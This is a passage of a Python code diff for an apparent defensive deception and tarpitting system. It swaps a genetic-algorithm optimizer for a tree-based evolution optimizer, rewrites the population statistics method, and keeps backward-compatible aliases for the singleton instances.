-                path_to_modify = random.choice(list(mutated.keys()))
-                content = mutated[path_to_modify]
-                
-                # Apply random modification
-                modifications = [
-                    lambda c: c + "\n# Modified by GA",
-                    lambda c: c.replace("2024", "2025"),
-                    lambda c: c + f"\n# Access count: {random.randint(1, 100)}",
-                ]
-                
-                modification = random.choice(modifications)
-                mutated[path_to_modify] = modification(content)
-        
-        return mutated
-    
-    def get_population_statistics(self) -> Dict:
-        """Get statistical summary of the current population."""
-        if not self.population:
+
+    def get_tree_statistics(self) -> Dict:
+        """Get statistical summary of the current tree population."""
+        if not self.trees:
             return {}
-        
-        fitnesses = [c.fitness for c in self.population.values()]
-        ages = [c.age for c in self.population.values()]
-        
+
+        fitnesses = [t.fitness for t in self.trees.values()]
+        depths = [t.depth for t in self.trees.values()]
+        leaf_counts = [len(self._get_all_leaf_paths(t.root)) for t in self.trees.values()]
+
         return {
             "generation": self.generation,
-            "population_size": len(self.population),
+            "num_trees": len(self.trees),
+            "population_size": len(self.trees),  # Alias for backward compatibility
             "best_fitness": max(fitnesses),
             "mean_fitness": sum(fitnesses) / len(fitnesses),
             "std_fitness": math.sqrt(sum((x - sum(fitnesses)/len(fitnesses))**2 for x in fitnesses) / len(fitnesses)) if len(fitnesses) > 1 else 0,
-            "mean_age": sum(ages) / len(ages),
-            "best_schema_id": self.best_schema.schema_id if self.best_schema else None,
+            "mean_depth": sum(depths) / len(depths),
+            "max_depth": max(depths),
+            "mean_leaves": sum(leaf_counts) / len(leaf_counts),
+            "best_tree_id": self.best_tree.tree_id if self.best_tree else None,
+            "total_pheromone_paths": len(self.path_pheromones),
         }
+
+    # Alias for backward compatibility with tests
+    get_population_statistics = get_tree_statistics
 
 
 # ============================================================================
@@ -852,8 +1120,13 @@ class DeceptionEvolutionGA:
 # ============================================================================
 
 # Singleton instances (import these in pipeline.py)
+# PSO for adaptive tarpitting (unchanged)
 pso_optimizer = AdaptiveTarpitPSO()
-ga_optimizer = DeceptionEvolutionGA()
+
+# RRT for deception schema evolution (IEEE Access 2025)
+# Note: ga_optimizer alias maintained for backward compatibility
+rrt_optimizer = DeceptionEvolutionRRT()
+ga_optimizer = rrt_optimizer  # Alias for pipeline compatibility
 
 
 # ============================================================================
